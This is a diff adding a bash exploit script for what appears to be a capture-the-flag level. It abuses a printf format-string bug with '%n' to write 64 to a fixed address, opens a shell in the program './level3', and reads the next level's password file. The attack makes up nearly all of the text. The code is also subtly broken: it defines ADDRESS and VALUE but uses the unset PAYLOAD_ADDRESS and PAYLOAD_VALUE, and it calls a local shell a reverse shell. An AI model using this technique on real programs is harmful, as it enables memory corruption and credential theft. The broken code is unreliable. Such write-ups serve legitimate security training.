@@ -1,0 +1,37 @@
+# Helper function, "hex 41424344" gives "ABCD"
+hex() { echo "$1" | xxd -p -r; }
+
+# Helper function, "hex_little_endian 41424344" gives "DBCA"
+hex_little_endian() { hex $(printf "$1" | rev | fold -b2 | rev | tr -d '\n') ; }
+
+# Helper function, "compute '16 - 4'" gives "12"
+compute() { echo "$1" | bc | tr -d '\n' ; }
+
+# We have to write '64' at the address 0x0804988c to get the reverse shell
+# The program use 'printf' with the input as a format string
+# We can use the '%n' conversion specifier to write a value to memory
+# We print 64 characters, then '%i$n'
+# i correspond to the stack index where '0x0804988c' is stored
+
+# Payload values
+ADDRESS="0804988c"
+VALUE="64"
+
+# We print the address '0x0804988c' and some fillers to reach 64 bytes
+PRINTF_ADDRESS=$(hex_little_endian ${PAYLOAD_ADDRESS})
+PRINTF_ADDRESS_SIZE=$(echo -n "${PRINTF_ADDRESS}" | wc -c)
+PRINTF_VALUE_FILLER="%$(compute "${PAYLOAD_VALUE} - ${PRINTF_ADDRESS_SIZE}")c"
+
+# We print the printf write instruction using '%n'
+# The address '0x0804988c' is written at the start of the buffer
+# Therefore, the stack index is (buffer - %esp) / 4
+BUFFER_OFFSET_TO_ESP=16
+PRINTF_WRITER_INDEX="$(compute "${BUFFER_OFFSET_TO_ESP} / 4")"
+PRINTF_WRITER="%${PRINTF_WRITER_INDEX}\$n"
+
+# We print our exploit to the output and wait for the reverse shell to open with cat
+INPUT="${PRINTF_ADDRESS}${PRINTF_VALUE_FILLER}${PRINTF_WRITER}"
+(echo "${INPUT}" && cat) | ./level3
+
+# We use the reverse shell to retrieve the password
+$ cat /home/user/level4/.pass
